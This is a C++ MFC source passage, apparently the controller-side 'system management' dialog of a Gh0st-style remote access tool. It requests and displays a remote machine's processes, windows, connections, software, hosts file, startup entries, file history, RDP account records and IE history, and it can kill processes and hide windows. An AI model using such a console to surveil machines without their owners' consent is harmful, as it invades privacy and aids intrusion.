// CSystemDlg.cpp: 实现文件
//

#include "pch.h"
#include "nbclass.h"
#include "CSystemDlg.h"
#include"CBzDlg.h"
#include "afxdialogex.h"
#include"..\..\common\macros.h"

CSystemDlg* g_CSystemDlg;
// CSystemDlg 对话框

IMPLEMENT_DYNAMIC(CSystemDlg, CDialog)

CSystemDlg::CSystemDlg(CWnd* pParent , CIOCPServer* pIOCPServer , ClientContext* pContext )
	: CDialog(IDD_SYSTEM, pParent)
{

	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
	//m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_SYSTEM));

}

CSystemDlg::~CSystemDlg()
{
}

void CSystemDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST_ENV, m_Env);
	DDX_Control(pDX, IDC_LIST_PEOCESS, m_pro);
	DDX_Control(pDX, IDC_LIST_WINDOWS, m_windows);
	DDX_Control(pDX, IDC_LIST_NET, m_net);
	DDX_Control(pDX, IDC_LIST_INSTALL, m_install);
	DDX_Control(pDX, IDC_LIST_RUN, m_run);
	DDX_Control(pDX, IDC_LIST_FILE, m_HistoryFile);
	DDX_Control(pDX, IDC_LIST_REMOT, m_mstsc);
	DDX_Control(pDX, IDC_TAB1, m_tab);
	DDX_Control(pDX, IDC_HOSTS, m_hosts);
	DDX_Control(pDX, IDC_GETHOST, m_butGethost);
	DDX_Control(pDX, IDC_SVAEHOST, m_butSavehost);
}

void CSystemDlg::OnReceiveComplete()
{


	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
		case TOKEN_PSLIST:
			ShowProcessList();
			break;
		case TOKEN_WSLIST:
			ShowWindowsList();
			break;
		case TOKEN_SOFTWARE:
			ShowSoftWareList();
			break;
		case TOKEN_IHLIST:
			ShowHistoryIE();
			break;
		case TOKEN_NSLIST:
			ShowNetStateList();
			break;
		case TOKEN_HOSTSINFO:
			ShowHostsInfo();
			break;
		case TOKEN_STARTUP:
			ShowStartupList();
			break;
		case TOKEN_REMOTE:
			ShowRemote();
			break;
		case TOKEN_IHFILE:
			ShowHistoryFile();
			break;
		default:
			// 传输发生异常数据
			break;
	}
	
}


BEGIN_MESSAGE_MAP(CSystemDlg, CDialog)
	ON_WM_SIZE()
	ON_NOTIFY(TCN_SELCHANGE, IDC_TAB1, &CSystemDlg::OnTcnSelchangeTab1)
	ON_WM_CLOSE()
	ON_EN_CHANGE(IDC_HOSTS, &CSystemDlg::OnEnChangeHosts)
	ON_BN_CLICKED(IDC_GETHOST, &CSystemDlg::OnBnClickedGethost)
	ON_BN_CLICKED(IDC_SVAEHOST, &CSystemDlg::OnBnClickedSvaehost)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_PEOCESS, &CSystemDlg::OnNMRClickListPeocess)
	ON_COMMAND(ID_PS_32793, &CSystemDlg::OnKillProcess)
	ON_COMMAND(ID_PS_32794, &CSystemDlg::OnGetPs)
	ON_COMMAND(ID_PS_32795, &CSystemDlg::OnDelPs)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_NET, &CSystemDlg::OnNMRClickListNet)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_WINDOWS, &CSystemDlg::OnNMRClickListWindows)
	ON_COMMAND(ID_WINDOWS_32810, &CSystemDlg::OnWindows)
	ON_COMMAND(ID_WINDOWS_32805, &CSystemDlg::OnWindowsHide)
	ON_COMMAND(ID_WINDOWS_32806, &CSystemDlg::OnWindowsShow)
	ON_COMMAND(ID_WINDOWS_32807, &CSystemDlg::OnWindowsClose)
	ON_COMMAND(ID_WINDOWS_32808, &CSystemDlg::OnWindowsMax)
	ON_COMMAND(ID_WINDOWS_32809, &CSystemDlg::OnWindowsMin)
	ON_COMMAND(ID_INISTALL_32816, &CSystemDlg::OnUnistall)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_INSTALL, &CSystemDlg::OnNMRClickListInstall)
	ON_COMMAND(ID_INISTALL_32817, &CSystemDlg::OnInistall32817)
	ON_NOTIFY(LVN_COLUMNCLICK, IDC_LIST_PEOCESS, &CSystemDlg::OnLvnColumnclickListPeocess)
	ON_NOTIFY(LVN_COLUMNCLICK, IDC_LIST_WINDOWS, &CSystemDlg::OnLvnColumnclickListWindows)
	ON_NOTIFY(LVN_COLUMNCLICK, IDC_LIST_NET, &CSystemDlg::OnLvnColumnclickListNet)
	ON_COMMAND(ID_PS_32877, &CSystemDlg::OnPsFind)
END_MESSAGE_MAP()

/// <summary>
/// 排版控件
/// </summary>
void CSystemDlg::AdjustList()
{
	RECT	 rectClient;
	if (!m_tab.GetSafeHwnd())
		return;
	GetClientRect(&rectClient);
	rectClient.top = 11;
	m_tab.MoveWindow(&rectClient);


	m_Env.SetParent(&m_tab);
	m_pro.SetParent(&m_tab);
	m_windows.SetParent(&m_tab);
	m_net.SetParent(&m_tab);
	m_install.SetParent(&m_tab);
	m_hosts.SetParent(&m_tab);
	m_run.SetParent(&m_tab);
	m_HistoryFile.SetParent(&m_tab);
	m_mstsc.SetParent(&m_tab);

	m_tab.GetClientRect(&rectClient);
	m_tab.AdjustRect(FALSE, &rectClient);

	rectClient.left -= 4;
	rectClient.top -= 2;
	rectClient.right += 4;
	rectClient.bottom += 2;

	m_Env.MoveWindow(&rectClient);
	m_pro.MoveWindow(&rectClient);
	m_windows.MoveWindow(&rectClient);
	m_net.MoveWindow(&rectClient);
	m_install.MoveWindow(&rectClient);
	
	m_run.MoveWindow(&rectClient);
	m_HistoryFile.MoveWindow(&rectClient);
	m_mstsc.MoveWindow(&rectClient);

	rectClient.bottom -= 115;
	rectClient.bottom += 84;
	m_hosts.MoveWindow(&rectClient);
	GetClientRect(&rectClient);

	GetClientRect(&rectClient);
	m_butGethost.MoveWindow(rectClient.right - 200, rectClient.bottom - 30, 70, 24);
	m_butSavehost.MoveWindow(rectClient.right - 100, rectClient.bottom - 30, 70, 24);
}

/// <summary>
/// 显示进程列表
/// </summary>
void CSystemDlg::ShowProcessList()
{
	char* lpBuffer = (char*)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	char* szExeFileName;
	char* szProcPriority;
	char* szThreadsCount;
	char* szProcUserName;
	char* szProcMemUsed;
	char* filesize;
	char* szProcFileName;
	DWORD	dwOffset = 0;
	CString strProcessID;
	m_pro.DeleteAllItems();

	int i;
	for (i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		LPDWORD	lpPID = LPDWORD(lpBuffer + dwOffset);
		szExeFileName = lpBuffer + dwOffset + sizeof(DWORD);
		szProcPriority = szExeFileName + lstrlen(szExeFileName) + 1;
		szThreadsCount = szProcPriority + lstrlen(szProcPriority) + 1;
		szProcUserName = szThreadsCount + lstrlen(szThreadsCount) + 1;
		szProcMemUsed = szProcUserName + lstrlen(szProcUserName) + 1;
		filesize = szProcMemUsed + lstrlen(szProcMemUsed) + 1;
		szProcFileName = filesize + lstrlen(filesize) + 1;

		strProcessID.Format("%5u", *lpPID);
		m_pro.InsertItem(i, szExeFileName);
		m_pro.SetItemText(i, 1, strProcessID);
		m_pro.SetItemText(i, 2, szProcPriority);
		m_pro.SetItemText(i, 3, szThreadsCount);
		m_pro.SetItemText(i, 4, szProcUserName);
		m_pro.SetItemText(i, 5, szProcMemUsed);
		m_pro.SetItemText(i, 6, filesize);
		m_pro.SetItemText(i, 7, szProcFileName);
		// ItemData 为进程ID
		m_pro.SetItemData(i, *lpPID);

		dwOffset += sizeof(DWORD) +
			lstrlen(szExeFileName) + 1 +
			lstrlen(szProcPriority) + 1 +
			lstrlen(szThreadsCount) + 1 +
			lstrlen(szProcUserName) + 1 +
			lstrlen(szProcMemUsed) + 1 +
			lstrlen(filesize) + 1 +
			lstrlen(szProcFileName) + 1;
	}

	strProcessID.Format("程序路径 / %d", i);
	LVCOLUMN lvc;
	lvc.mask = LVCF_TEXT;
	lvc.pszText = strProcessID.GetBuffer(0);
	lvc.cchTextMax = strProcessID.GetLength();
	m_pro.SetColumn(7, &lvc);

}

void CSystemDlg::initView()
{
	
	m_tab.InsertItem(0, "进程管理");
	m_tab.InsertItem(1, "窗口管理");
	m_tab.InsertItem(2, "网络连接");
	m_tab.InsertItem(3, "安装信息");
	m_tab.InsertItem(4, "host文件");
	m_tab.InsertItem(5, "启动项");
	m_tab.InsertItem(6, "文件历史");
	m_tab.InsertItem(7, "远程记录");
	m_tab.InsertItem(8, "IE历史");

	m_pro.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT | LVS_EX_UNDERLINEHOT | LVS_EX_INFOTIP);
	m_pro.InsertColumn(0, "映像名称", LVCFMT_LEFT, 160);
	m_pro.InsertColumn(1, "PID", LVCFMT_LEFT, 60);
	m_pro.InsertColumn(2, "优先级", LVCFMT_LEFT, 60);
	m_pro.InsertColumn(3, "线程数", LVCFMT_LEFT, 60);
	m_pro.InsertColumn(4, "用户名", LVCFMT_LEFT, 100);
	m_pro.InsertColumn(5, "内存使用", LVCFMT_LEFT, 70);
	m_pro.InsertColumn(6, "文件大小", LVCFMT_LEFT, 100);
	m_pro.InsertColumn(7, "程序路径", LVCFMT_LEFT, 550);

	m_windows.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT | LVS_EX_UNDERLINEHOT | LVS_EX_INFOTIP);
	m_windows.InsertColumn(0, "PID", LVCFMT_LEFT, 70);
	m_windows.InsertColumn(1, "句柄", LVCFMT_LEFT, 120);
	m_windows.InsertColumn(2, "窗口名称", LVCFMT_LEFT, 300);
	m_windows.InsertColumn(3, "窗口状态", LVCFMT_LEFT, 70);


	m_net.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT | LVS_EX_UNDERLINEHOT | LVS_EX_INFOTIP);
	m_net.InsertColumn(0, "进程名", LVCFMT_LEFT, 160);
	m_net.InsertColumn(1, "PID", LVCFMT_LEFT, 60);
	m_net.InsertColumn(2, "协议", LVCFMT_LEFT, 50);
	m_net.InsertColumn(3, "本地地址:端口", LVCFMT_LEFT, 150);
	m_net.InsertColumn(4, "远程地址:端口", LVCFMT_LEFT, 150);
	m_net.InsertColumn(5, "目标IP归属地", LVCFMT_LEFT, 300);
	m_net.InsertColumn(6, "连接状态", LVCFMT_LEFT, 80);

	m_install.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT | LVS_EX_UNDERLINEHOT | LVS_EX_INFOTIP);
	m_install.InsertColumn(0, "软件名称", LVCFMT_LEFT, 200);
	m_install.InsertColumn(1, "发行商", LVCFMT_LEFT, 200);
	m_install.InsertColumn(2, "版本", LVCFMT_LEFT, 75);
	m_install.InsertColumn(3, "安装时间", LVCFMT_LEFT, 80);
	m_install.InsertColumn(4, "卸载命令及参数", LVCFMT_LEFT, 600);

	m_Env.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT | LVS_EX_UNDERLINEHOT | LVS_EX_INFOTIP);
	m_Env.InsertColumn(0, "序号", LVCFMT_LEFT, 70);
	m_Env.InsertColumn(1, "访问时间", LVCFMT_LEFT, 200);
	m_Env.InsertColumn(2, "标题", LVCFMT_LEFT, 200);
	m_Env.InsertColumn(3, "网页地址", LVCFMT_LEFT, 700);


	m_run.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT | LVS_EX_UNDERLINEHOT);
	m_run.InsertColumn(0, "程序名称", LVCFMT_LEFT, 200);
	m_run.InsertColumn(1, "程序路径", LVCFMT_LEFT, 460);
	m_run.InsertColumn(2, "键值", LVCFMT_LEFT, 500);

	m_HistoryFile.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT | LVS_EX_UNDERLINEHOT | LVS_EX_INFOTIP);
	m_HistoryFile.InsertColumn(0, "序号", LVCFMT_LEFT, 70);
	m_HistoryFile.InsertColumn(1, "文件路径", LVCFMT_LEFT, 600);
	m_HistoryFile.InsertColumn(2, "最后访问时间", LVCFMT_LEFT, 300);

	m_mstsc.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT | LVS_EX_UNDERLINEHOT | LVS_EX_INFOTIP);
	m_mstsc.InsertColumn(0, "序号", LVCFMT_LEFT, 70);
	m_mstsc.InsertColumn(1, "ip", LVCFMT_LEFT, 150);
	m_mstsc.InsertColumn(2, "连接时使用的账户", LVCFMT_LEFT, 300);



	AdjustList();


}
// CSystemDlg 消息处理程序


BOOL CSystemDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	g_CSystemDlg = this;
	// TODO: Add extra initialization here
	if (((CnbclassApp*)AfxGetApp())->m_bIsQQwryExist)
	{
		m_SQQwry.SetPath("qqwry.dat");
	}

	//设置标题
	CString str;
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	str.Format("\\\\%s - 系统管理", bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
	SetWindowText(str);
	initView();

	
	ShowProcessList();
	//显示选中的
	ShowSelectWindow(TRUE);
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);
	// TODO:  在此添加额外的初始化

	return TRUE;  // return TRUE unless you set the focus to a control
				  // 异常: OCX 属性页应返回 FALSE
}

/// <summary>
/// 窗口改变的消息
/// </summary>
/// <param name="nType"></param>
/// <param name="cx"></param>
/// <param name="cy"></param>
void CSystemDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialog::OnSize(nType, cx, cy);
	AdjustList();
	// TODO: 在此处添加消息处理程序代码
}


BOOL CSystemDlg::PreTranslateMessage(MSG* pMsg)
{
	if (pMsg->message == WM_KEYDOWN && ((pMsg->wParam == VK_RETURN && pMsg->hwnd != m_hosts.m_hWnd) || pMsg->wParam == VK_ESCAPE))
	{
		return true;
	}
	return CDialog::PreTranslateMessage(pMsg);


}

/// <summary>
/// tab控件变换
/// </summary>
/// <param name="pNMHDR"></param>
/// <param name="pResult"></param>
void CSystemDlg::OnTcnSelchangeTab1(NMHDR* pNMHDR, LRESULT* pResult)
{
	ShowSelectWindow();
	*pResult = 0;
	// TODO: 在此添加控件通知处理程序代码
	*pResult = 0;
}

/// <summary>
/// 只显示选中控件
/// </summary>
/// <param name="bInit"></param>
void CSystemDlg::ShowSelectWindow(BOOL bInit)
{

	switch (m_tab.GetCurSel())
	{
	case 0:    //显示进程
		m_pro.ShowWindow(SW_SHOW); //进程管理
		m_windows.ShowWindow(SW_HIDE);    //窗口管理
		m_net.ShowWindow(SW_HIDE);    //网络连接
		m_install.ShowWindow(SW_HIDE);   //安装信息
		m_hosts.ShowWindow(SW_HIDE);   //host
		m_run.ShowWindow(SW_HIDE);  //启动项
		m_HistoryFile.ShowWindow(SW_HIDE);  //文件历史
		m_mstsc.ShowWindow(SW_HIDE); //远程记录
		m_Env.ShowWindow(SW_HIDE);      //IE历史
		OnShowWindow(0);
		if (m_pro.GetItemCount() == 0)
			GetProcessList();
		break;
	case 1:	//显示窗口
		m_pro.ShowWindow(SW_HIDE); //进程管理
		m_windows.ShowWindow(SW_SHOW);    //窗口管理
		m_net.ShowWindow(SW_HIDE);    //网络连接
		m_install.ShowWindow(SW_HIDE);   //安装信息
		m_hosts.ShowWindow(SW_HIDE);   //host
		m_run.ShowWindow(SW_HIDE);  //启动项
		m_HistoryFile.ShowWindow(SW_HIDE);  //文件历史
		m_mstsc.ShowWindow(SW_HIDE); //远程记录
		m_Env.ShowWindow(SW_HIDE);      //IE历史
		OnShowWindow(0);
		if (m_windows.GetItemCount() == 0)
			GetWindowsList();
		break;
	case 2:	//显示网络连接
		m_pro.ShowWindow(SW_HIDE); //进程管理
		m_windows.ShowWindow(SW_HIDE);    //窗口管理
		m_net.ShowWindow(SW_SHOW);    //网络连接
		m_install.ShowWindow(SW_HIDE);   //安装信息
		m_hosts.ShowWindow(SW_HIDE);   //host
		m_run.ShowWindow(SW_HIDE);  //启动项
		m_HistoryFile.ShowWindow(SW_HIDE);  //文件历史
		m_mstsc.ShowWindow(SW_HIDE); //远程记录
		m_Env.ShowWindow(SW_HIDE);      //IE历史
		OnShowWindow(0);
		if (m_net.GetItemCount() == 0)
			GetNetStateList();
		break;
	case 3:  //显示安装信息
		m_pro.ShowWindow(SW_HIDE); //进程管理
		m_windows.ShowWindow(SW_HIDE);    //窗口管理
		m_net.ShowWindow(SW_HIDE);    //网络连接
		m_install.ShowWindow(SW_SHOW);   //安装信息
		m_hosts.ShowWindow(SW_HIDE);   //host
		m_run.ShowWindow(SW_HIDE);  //启动项
		m_HistoryFile.ShowWindow(SW_HIDE);  //文件历史
		m_mstsc.ShowWindow(SW_HIDE); //远程记录
		m_Env.ShowWindow(SW_HIDE);      //IE历史
		OnShowWindow(0);
		if (m_install.GetItemCount() == 0)
			GetSoftWareList(); 
		break;
	case 4:	//显示host
		m_pro.ShowWindow(SW_HIDE); //进程管理
		m_windows.ShowWindow(SW_HIDE);    //窗口管理
		m_net.ShowWindow(SW_HIDE);    //网络连接
		m_install.ShowWindow(SW_HIDE);   //安装信息
		m_hosts.ShowWindow(SW_SHOW);   //host
		m_run.ShowWindow(SW_HIDE);  //启动项
		m_HistoryFile.ShowWindow(SW_HIDE);  //文件历史
		m_mstsc.ShowWindow(SW_HIDE); //远程记录
		m_Env.ShowWindow(SW_HIDE);      //IE历史
		OnShowWindow(1);
		if (m_hosts.GetWindowTextLength() == 0)
			GetHostsInfo();
		break;
	case 5:  //显示启动项
		m_pro.ShowWindow(SW_HIDE); //进程管理
		m_windows.ShowWindow(SW_HIDE);    //窗口管理
		m_net.ShowWindow(SW_HIDE);    //网络连接
		m_install.ShowWindow(SW_HIDE);   //安装信息
		m_hosts.ShowWindow(SW_HIDE);   //host
		m_run.ShowWindow(SW_SHOW);  //启动项
		m_HistoryFile.ShowWindow(SW_HIDE);  //文件历史
		m_mstsc.ShowWindow(SW_HIDE); //远程记录
		m_Env.ShowWindow(SW_HIDE);      //IE历史
		OnShowWindow(0);
		if (m_run.GetItemCount() == 0)
			GetStartupList();
		break;
	case 6:  //文件历史
		m_pro.ShowWindow(SW_HIDE); //进程管理
		m_windows.ShowWindow(SW_HIDE);    //窗口管理
		m_net.ShowWindow(SW_HIDE);    //网络连接
		m_install.ShowWindow(SW_HIDE);   //安装信息
		m_hosts.ShowWindow(SW_HIDE);   //host
		m_run.ShowWindow(SW_HIDE);  //启动项
		m_HistoryFile.ShowWindow(SW_SHOW);  //文件历史
		m_mstsc.ShowWindow(SW_HIDE); //远程记录
		m_Env.ShowWindow(SW_HIDE);      //IE历史
		OnShowWindow(0);
		if (m_HistoryFile.GetItemCount() == 0)
			GetHistoryFile();
		break;
	case 7: //远程记录
		m_pro.ShowWindow(SW_HIDE); //进程管理
		m_windows.ShowWindow(SW_HIDE);    //窗口管理
		m_net.ShowWindow(SW_HIDE);    //网络连接
		m_install.ShowWindow(SW_HIDE);   //安装信息
		m_hosts.ShowWindow(SW_HIDE);   //host
		m_run.ShowWindow(SW_HIDE);  //启动项
		m_HistoryFile.ShowWindow(SW_HIDE);  //文件历史
		m_mstsc.ShowWindow(SW_SHOW); //远程记录
		m_Env.ShowWindow(SW_HIDE);      //IE历史
		OnShowWindow(0);
		if (m_mstsc.GetItemCount() == 0)
			GetRemote(); 
		break;
	case 8: //ie历史
		m_pro.ShowWindow(SW_HIDE); //进程管理
		m_windows.ShowWindow(SW_HIDE);    //窗口管理
		m_net.ShowWindow(SW_HIDE);    //网络连接
		m_install.ShowWindow(SW_HIDE);   //安装信息
		m_hosts.ShowWindow(SW_HIDE);   //host
		m_run.ShowWindow(SW_HIDE);  //启动项
		m_HistoryFile.ShowWindow(SW_HIDE);  //文件历史
		m_mstsc.ShowWindow(SW_HIDE); //远程记录
		m_Env.ShowWindow(SW_SHOW);      //IE历史
		OnShowWindow(0);
		if (m_Env.GetItemCount() == 0)
			 GetHistoryIE(); 
		break;
	}
}

void CSystemDlg::OnShowWindow(int Show)
{
	if (Show)
	{
		GetDlgItem(IDC_SVAEHOST)->ShowWindow(SW_SHOW);
		GetDlgItem(IDC_GETHOST)->ShowWindow(SW_SHOW);
	}
	else
	{
		GetDlgItem(IDC_SVAEHOST)->ShowWindow(SW_HIDE);
		GetDlgItem(IDC_GETHOST)->ShowWindow(SW_HIDE);
	}

}

/// <summary>
/// 获取进程列表
/// </summary>
void CSystemDlg::GetProcessList()
{
	BYTE bToken = COMMAND_PSLIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}

/// <summary>
/// 获取窗口列表
/// </summary>
void CSystemDlg::GetWindowsList()
{
	BYTE bToken = COMMAND_WSLIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}



/// <summary>
/// 获取host
/// </summary>
void CSystemDlg::GetHostsInfo()
{
	BYTE bToken = COMMAND_GETHOSTS;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}

/// <summary>
/// 获取启动项
/// </summary>
void CSystemDlg::GetStartupList()
{
	BYTE bToken = COMMAND_STARTUP;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}

/// <summary>
/// 获取网络连接
/// </summary>
void	CSystemDlg::GetNetStateList()
{
	BYTE bToken = COMMAND_NSLIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);

}
/// <summary>
/// /获取安装信息
/// </summary>
void CSystemDlg::GetSoftWareList()
{
	BYTE bToken = COMMAND_SOFTWARELIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}
/// <summary>
/// 获取历史文件访问记录
/// </summary>
void CSystemDlg::GetHistoryFile()
{
	BYTE bToken = COMMAND_IHFILE;
	m_iocpServer->Send(m_pContext, &bToken, 1);

}
/// <summary>
/// 获取远程连接记录
/// </summary>
void CSystemDlg::GetRemote()
{
	BYTE bToken = COMMAND_REMOTE;
	m_iocpServer->Send(m_pContext, &bToken, 1);

}
/// <summary>
/// IE历史访问记录
/// </summary>
void CSystemDlg::GetHistoryIE()
{
	BYTE bToken = COMMAND_IHLIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}
/// <summary>
/// 关闭
/// </summary>
void CSystemDlg::OnClose()
{
	// 	BYTE  bToken = COMMAND_STOPED;
	// 	m_iocpServer->Send(m_pContext, &bToken, 1);  //发送CPU 内存 停止信号
	// 	ShowWindow(SW_HIDE);
	// 	Sleep(1000);
	m_pContext->m_Dialog[0] = 0;
	closesocket(m_pContext->m_Socket);
	DestroyWindow();
	CDialog::OnClose();
}

/// <summary>
/// 显示启动项
/// </summary>
void CSystemDlg::ShowStartupList()
{
	m_run.DeleteAllItems();

	CString str;
	LPBYTE	lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD	dwOffset = 0;
	int i;
	for (i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		for (int j = 0; j < 3; j++)
		{
			char* lpString = (char*)lpBuffer + dwOffset;

			if (j == 0)
				m_run.InsertItem(i, lpString, 0);
			else
				m_run.SetItemText(i, j, lpString);

			dwOffset += lstrlen(lpString) + 1;
		}
	}

	str.Format("程序名称 / %d", i);
	LVCOLUMN lvc;
	lvc.mask = LVCF_TEXT;
	lvc.pszText = str.GetBuffer(0);
	lvc.cchTextMax = str.GetLength();
	m_run.SetColumn(0, &lvc);
}

/// <summary>
/// 显示host文件
/// </summary>
void CSystemDlg::ShowHostsInfo()
{
	LPBYTE	lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	m_hosts.SetWindowText((LPCSTR)lpBuffer);

}

/// <summary>
/// 显示窗口
/// </summary>
void CSystemDlg::ShowWindowsList()
{
	LPBYTE	lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD	dwOffset = 0;
	char* lpTitle = NULL;
	//m_list_process.DeleteAllItems();
	bool isDel = false;

	do
	{
		isDel = false;
		for (int j = 0; j < m_windows.GetItemCount(); j++)
		{
			CString temp = m_windows.GetItemText(j, 2);
			CString restr = "隐藏";
			if (temp != restr)
			{
				m_windows.DeleteItem(j);
				isDel = true;
				break;
			}
		}

	} while (isDel);

	CString	str;

	int i;

	for (i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		LPDWORD	lpPID = (LPDWORD)(lpBuffer + dwOffset);
		HWND* phWnd = (HWND*)(lpBuffer + dwOffset + sizeof(DWORD));
		lpTitle = (char*)lpBuffer + dwOffset + sizeof(DWORD) + sizeof(HWND);
		str.Format("%5u", *lpPID);
		m_windows.InsertItem(i, str);
		str.Format("%5u", *phWnd);
		m_windows.SetItemText(i, 1, str);
		m_windows.SetItemText(i, 2, lpTitle);
		m_windows.SetItemText(i, 3, "显示"); 
		// ItemData 为窗口句柄
		m_windows.SetItemData(i, (DWORD)*phWnd);  //(d)
		dwOffset += sizeof(DWORD) + sizeof(HWND) + lstrlen(lpTitle) + 1;
	}
	str.Format("窗口名称 / %d", i);
	LVCOLUMN lvc;
	lvc.mask = LVCF_TEXT;
	lvc.pszText = str.GetBuffer(0);
	lvc.cchTextMax = str.GetLength();
	m_windows.SetColumn(2, &lvc);
}

/// <summary>
/// 显示网络连接
/// </summary>
void	CSystemDlg::ShowNetStateList()
{
	m_net.DeleteAllItems();
	LPBYTE	lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD	dwOffset = 0;
	CString str, IPAddress;

	for (int i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		for (int j = 0; j < 7; j++)
		{
			if (j == 0)
			{
				char* lpString = (char*)lpBuffer + dwOffset;

				m_net.InsertItem(i, lpString, 0);
				dwOffset += lstrlen(lpString) + 1;
			}
			else if (j == 1)
			{
				LPDWORD	lpPID = LPDWORD(lpBuffer + dwOffset);
				str.Format("%d", *lpPID);
				m_net.SetItemText(i, j, str);
				m_net.SetItemData(i, *lpPID);

				dwOffset += sizeof(DWORD) + 1;
			}
			else if (j == 5)
			{
				IPAddress = m_net.GetItemText(i, 4);

				int n = IPAddress.ReverseFind(':');
				if (n > 0)
				{
					IPAddress = IPAddress.Left(n);

					str = m_SQQwry.IPtoAdd(IPAddress);

					m_net.SetItemText(i, j, str);
				}
			}
			else
			{
				char* lpString = (char*)lpBuffer + dwOffset;

				m_net.SetItemText(i, j, lpString);
				dwOffset += lstrlen(lpString) + 1;
			}
		}
	}

}

/// <summary>
/// 显示安装信息
/// </summary>
void CSystemDlg::ShowSoftWareList()
{
	LPBYTE	lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD	dwOffset = 0;

	m_install.DeleteAllItems();

	for (int i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		for (int j = 0; j < 5; j++)
		{
			char* lpString = (char*)lpBuffer + dwOffset;

			if (j == 0)
				m_install.InsertItem(i, lpString, 0);
			else
				m_install.SetItemText(i, j, lpString);

			dwOffset += lstrlen(lpString) + 1;
		}
	}
}

/// <summary>
/// 显示历史访问文件
/// </summary>
void CSystemDlg::ShowHistoryFile()
{
	LPBYTE	lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD	dwOffset = 0;
	DWORD pBufferLen = m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;
	m_HistoryFile.DeleteAllItems();
	CString str;

	for (int i = 0; dwOffset < pBufferLen; i++)
	{
			char* pszFileName = NULL;
			FILETIME	lsatAccessTime;		//最后访问时间

				str.Format("%d", i);

				pszFileName = (char*)lpBuffer + dwOffset;
				if (*pszFileName == 0)
				{
					break;
				}
				m_HistoryFile.InsertItem(i, str, 0);
				//显示文件名 
				m_HistoryFile.SetItemText(i, 1, pszFileName);
				dwOffset += lstrlen(pszFileName) + 1;
				//显示最后访问时间
				memcpy(&lsatAccessTime, lpBuffer + dwOffset , sizeof(FILETIME));
				dwOffset += 8;
				CTime	time(lsatAccessTime);
				m_HistoryFile.SetItemText(i, 2, time.Format(_T("%Y-%m-%d %H:%M")));
			}

}

/// <summary>
/// 显示远程连接记录
/// </summary>
void CSystemDlg::ShowRemote()
{
	LPBYTE	lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD	dwOffset = 0;
	DWORD pBufferLen = m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;
	m_mstsc.DeleteAllItems();
	CString str;

	for (size_t i = 0; dwOffset < pBufferLen; i++)
	{

		if (*(lpBuffer+ dwOffset) == 0)
		{
			break;
		}

		str.Format("%d", i);
		for (size_t j = 0; j < 3; j++)
		{
			char* String = (char*)lpBuffer + dwOffset;

			if (j == 0)
			{
				m_mstsc.InsertItem(i, str);
				continue;
			}	
			else
				m_mstsc.SetItemText(i, j, String);

			dwOffset += lstrlen(String) + 1;
		}
	}
}



void CSystemDlg::ShowHistoryIE()
{
	m_Env.DeleteAllItems();

	LPBYTE	lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD	dwOffset = 0;

	CString	str;
	for (int i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		str.Format("%d", i);

		for (int j = 0; j < 4; j++)
		{
			if (j == 0)
				m_Env.InsertItem(i, str, 0);
			else
			{
				char* lpString = (char*)lpBuffer + dwOffset;

				m_Env.SetItemText(i, j, lpString);

				dwOffset += lstrlen(lpString) + 1;
			}
		}
	}
}


void CSystemDlg::PostNcDestroy()
{
